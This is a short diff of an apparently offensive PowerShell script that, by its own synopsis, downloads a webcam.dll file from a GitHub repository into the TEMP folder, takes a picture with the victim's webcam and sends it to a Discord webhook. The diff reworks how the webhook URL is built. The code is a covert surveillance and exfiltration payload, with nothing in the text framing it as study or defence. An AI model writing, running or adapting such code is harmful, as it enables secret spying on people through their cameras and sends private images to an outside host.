@@ -4,9 +4,10 @@ SYNOPSIS
 download a webcam.dll file, find a webcam cand take a picture then send it to discord.
 
 #>
-
 $hookurl = "$dc"
-if ($hookurl.Ln -lt 120){$hookurl = (irm $hookurl).url}
+if ($hookurl.Length -lt 120){
+	$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
+}
 $dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
 if (-not (Test-Path $dllPath)) {
     $url = "https://github.com/beigeworm/assets/raw/main/webcam.dll"
